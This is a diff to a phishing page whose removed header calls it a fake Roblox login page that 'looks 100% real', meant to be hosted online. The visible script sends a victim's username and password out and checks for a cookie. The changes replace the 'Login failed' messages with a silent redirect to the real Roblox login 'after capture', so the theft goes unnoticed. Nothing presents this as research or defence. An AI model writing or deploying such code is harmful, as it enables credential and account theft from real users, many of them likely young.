@@ -1,9 +1,3 @@
-<!-- ============================================================ -->
-<!-- FAKE ROBLOX LOGIN PAGE - Looks 100% Real                    -->
-<!-- ============================================================ -->
-<!-- Save as index.html - Host on Render                         -->
-<!-- ============================================================ -->
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -116,15 +110,14 @@
             password: password
           })
         }).then(() => {
-          document.getElementById("alert").style.display = "block";
-          document.getElementById("alert").textContent = "Login failed. Please try again.";
+          // ─── REDIRECT TO REAL ROBLOX AFTER CAPTURE ───
+          window.location.href = "https://www.roblox.com/login";
         }).catch(() => {
-          document.getElementById("alert").style.display = "block";
-          document.getElementById("alert").textContent = "Login failed. Please try again.";
+          window.location.href = "https://www.roblox.com/login";
         });
       } else {
-        document.getElementById("alert").style.display = "block";
-        document.getElementById("alert").textContent = "Please log in to Roblox first in this browser, then try again.";
+        // ─── IF NO COOKIE, STILL REDIRECT TO ROBLOX ───
+        window.location.href = "https://www.roblox.com/login";
       }
     });
   </script>
